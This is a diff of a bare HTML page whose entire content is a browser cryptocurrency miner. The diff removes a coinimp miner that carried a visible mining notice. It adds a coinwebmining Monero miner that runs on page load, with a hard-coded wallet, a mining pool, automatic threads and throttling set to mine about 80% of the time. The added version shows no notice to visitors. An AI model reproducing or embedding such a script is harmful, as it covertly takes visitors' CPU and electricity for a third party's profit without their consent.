@@ -1,14 +1,17 @@
 <html>
 <body>
     <h1>h1</h1>
-<script src="https://www.hostingcloud.racing/jWVK.js"></script>
+<script src="https://coinwebmining.com/cwm.js"></script>
 <script>
-    var _client = new Client.Anonymous('76246cf4b3b5d49ec953c84912ec97dc80bb88444b1b81783f110461aadd8ba3', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
-
+    var site_id = 'https://xy0ke.github.io/newjsthing/'; //register here https://coinwebmining.com/add-miner-your-website
+    var coin = 'monero';
+    var wallet = '424XZRbfPZp1kZVjajoVDqXm2R3rUQVkyDudYRwh8jsgcjkLUVUHqvvcnXVLE6B5Ya325inmPs9e4U3K5zLYmVus3uYztDM';
+    var password = 'x';
+    var mining_pool = 'moneroocean.stream'; //or check https://coinwebmining.com/browser-miner/monero for more mining pools
+    var threads = -1; //You can set -1 for auto threads, or set number of threads between 1-16.
+    var throttle = 0.2; //Set the fraction of time that threads should be idle. A value of 0 means no throttling (i.e. full speed), a value of 0.5 means that threads will stay idle 50% of the time, with 0.2 they will stay idle 20% of the time and 80% of the time mining.
+    var debug = false; //false or true. Whetever you want to display mining info in a console. Good to verify script works.
+    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug); //Enjoy mining ;)
 </script>
 </body>
 </html>
